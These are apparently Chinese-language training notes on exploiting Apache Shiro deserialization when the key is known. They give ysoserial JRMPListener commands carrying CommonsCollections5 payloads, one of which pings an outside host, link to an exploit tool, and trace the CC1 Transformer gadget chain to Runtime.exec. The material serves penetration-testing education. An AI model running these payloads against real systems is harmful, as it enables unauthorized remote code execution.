# JAVA攻防-Shiro专题&有key无利用链&JRMP协议&CC1&CB1链分析&Transform执行链

```java
#Shrio有key无链：
JRMP指的是Java远程方法协议（Java Remote Method Protocol）。它是 Java 对象实现远程通信的基础技术，也是Java RMI（Remote Method Invocation，远程方法调用）的底层通信协议。借助JRMP，运行于某个Java虚拟机（JVM）中的对象能够调用另一个JVM中对象的方法，就如同调用本地对象的方法一样便捷。

非常规链：
https://github.com/wyzxxz/shiro_rce_tool
https://mp.weixin.qq.com/s/MdCUfyaUCAa2M3P3H1NsGw

其他链JRMPClient
1、生成JRMPListener
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping kfxmlanpak.zaza.eu.org"
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "calc"
2、shiro_tool JRMP模式
2.1、java-chains JRMP模式

#CC链-Transform&TransformedMap
参考：https://mp.weixin.qq.com/s/J_YeNkLN6KYTCVDYFh1dvQ
commons-collections 	
    Gadget chain:
		ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject())
                MapEntry#setValue
                    TransformedMap#checkSetValue
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                                  Runtime.class
                              InvokerTransformer.transform()
                                  getRuntime().exec("calc");
                                  Class.getMethod()
                                  Runtime.getRuntime()
                                  Runtime.exec()

1、寻找sink执行点
作用：执行点触发RCE执行
->ChainedTransformer#transform()
->ConstantTransformer#transform()
->InvokerTransformer#transform()
2、寻找gadget调用链
作用：调用链实现承上启下
->TransformedMap#checkSetValue
->MapEntry#setValue
3、寻找Source入口点
作用：入口点重写方法调用
->AnnotationInvocationHandler#readObject()#setValue
->ObjectInputStream#readObject()

```

